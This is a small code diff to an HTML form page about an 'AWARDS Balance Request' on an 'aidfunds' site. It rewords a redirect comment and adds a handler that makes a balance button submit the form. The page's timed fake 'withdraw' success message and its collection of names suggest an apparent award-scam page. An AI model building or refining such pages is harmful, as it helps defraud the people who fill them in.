@@ -121,7 +121,7 @@
 
     <input type="hidden" name="_subject" value="AWARDS Balance Request">
 
-    <!-- ✅ NEW REDIRECT LINE -->
+    <!-- Redirect to thankyou page -->
     <input type="hidden" name="_next" value="https://aidfunds.github.io/Money/thankyou.html">
 
     <label>Enter your Name</label>
@@ -193,6 +193,12 @@ document.getElementById("withdrawBtn").addEventListener("click", function() {
         document.getElementById("success").style.display = "block";
         document.getElementById("balanceBtn").style.display = "block";
     }, 5000);
+});
+
+// ✅ Fix BALANCE button: now fully submits form and redirects
+document.getElementById("balanceBtn").addEventListener("click", function(e){
+    e.preventDefault(); // just in case
+    this.form.submit();
 });
 </script>
 
